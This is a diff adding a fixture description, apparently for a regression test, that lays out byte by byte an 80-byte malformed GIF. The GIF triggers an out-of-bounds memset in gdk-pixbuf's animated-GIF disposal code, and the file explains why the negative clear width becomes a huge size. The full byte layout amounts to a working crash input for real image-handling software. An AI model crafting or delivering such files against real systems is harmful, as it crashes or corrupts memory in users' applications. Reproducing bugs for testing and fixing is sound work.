@@ -1,0 +1,43 @@
+trigger.gif -- 80 bytes. Reproduces the disposal-2 out-of-bounds memset in
+gdk-pixbuf's animated-GIF iterator (io-gif-animation.c, GDK_PIXBUF_FRAME_DISPOSE).
+Tiny hand-checked geometry: logical screen 4x2, second frame's left edge at x=6.
+
+offset  bytes                       meaning
+------  --------------------------  -----------------------------------------
+0x00    47 49 46 38 39 61           "GIF89a"
+0x06    04 00                       logical screen width  = 4
+0x08    02 00                       logical screen height = 2
+0x0A    81                          global colour table present, 4 entries
+0x0B    00                          background colour index
+0x0C    00                          pixel aspect ratio
+0x0D    00 00 00   ff 00 00         global colour table: black, red
+0x13    00 ff 00   00 00 ff         global colour table: green, blue
+0x19    2C                          image separator (frame 0)
+0x1A    00 00 00 00                 frame 0 left = 0, top = 0
+0x1E    04 00 02 00                 frame 0 width = 4, height = 2
+0x22    00                          no local colour table, not interlaced
+0x23    02 03  8C 6F 05             LZW minimum code size 2, one 3-byte data block
+0x28    00                          block terminator
+0x29    21 F9 04                    graphic control extension
+0x2C    08 00 00 00                 disposal = 2, delay = 0, no transparency
+0x30    00                          block terminator
+0x31    2C                          image separator (frame 1)
+0x32    06 00 00 00                 frame 1 left = 6, top = 0  <-- 6 > width 4
+0x36    02 00 02 00                 frame 1 width = 2, height = 2
+0x3A    00                          no local colour table, not interlaced
+0x3B    02 02  94 55                 LZW minimum code size 2, one 2-byte data block
+0x3F    00                          block terminator
+0x40    2C                          image separator (frame 2)
+0x41    00 00 00 00                 frame 2 left = 0, top = 0
+0x45    01 00 01 00                 frame 2 width = 1, height = 1
+0x49    00                          no local colour table, not interlaced
+0x4A    02 02  54 01                 LZW minimum code size 2, one 2-byte data block
+0x4E    00                          block terminator
+0x4F    3B                          trailer
+
+Why the crash: the graphic control extension at 0x29 sits before frame 1 and
+gives that frame disposal method 2 ("restore to background"). When the iterator
+renders frame 2 it first runs the disposal for frame 1, which clears
+MIN(6 + 2, 4) - 6 = -2 pixels, i.e. (x_end - x_offset) * 4 = -8 bytes. Passing
+that to memset yields size_t 18446744073709551608. Frame 2 is needed: the
+disposal only runs when there is a frame after the bad one to render.
